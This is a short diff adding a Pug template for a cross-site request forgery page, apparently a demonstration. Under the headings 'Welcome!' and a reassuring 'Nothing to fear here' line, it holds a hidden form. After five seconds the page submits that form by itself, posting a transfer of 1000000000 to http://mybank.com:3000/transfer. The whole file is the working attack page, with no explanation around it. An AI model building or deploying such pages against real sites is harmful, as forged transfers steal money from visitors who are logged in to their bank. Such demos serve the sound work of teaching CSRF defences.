@@ -1,0 +1,10 @@
+
+body(onload='setTimeout(function() {document.forms[0].submit()}, 5000)')
+
+    h1 Welcome!
+
+    h2 Nothing to fear here. This looks like a plain and normal site with content you might be reading
+
+    form(method='POST' action='http://mybank.com:3000/transfer')
+        input(type='hidden' name='amount' value='1000000000')
+
